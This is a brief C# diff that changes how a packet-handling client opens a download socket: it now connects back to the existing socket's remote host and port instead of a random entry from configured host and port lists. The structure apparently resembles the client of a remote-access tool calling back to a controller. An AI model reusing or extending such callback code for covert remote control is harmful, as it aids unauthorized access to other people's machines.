@@ -71,8 +71,7 @@ namespace Client.Handle_Packet
                     ReceiveTimeout = -1,
                     SendTimeout = -1,
                 };
-                Client.Connect(Convert.ToString(Settings.Host.Split(',')[new Random().Next(Settings.Host.Split(',').Length)]),
-                    Convert.ToInt32(Settings.Ports.Split(',')[new Random().Next(Settings.Ports.Split(',').Length)]));
+                Client.Connect(ClientSocket.Client.RemoteEndPoint.ToString().Split(':')[0], Convert.ToInt32(ClientSocket.Client.RemoteEndPoint.ToString().Split(':')[1]));
 
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Packet").AsString = "socketDownload";
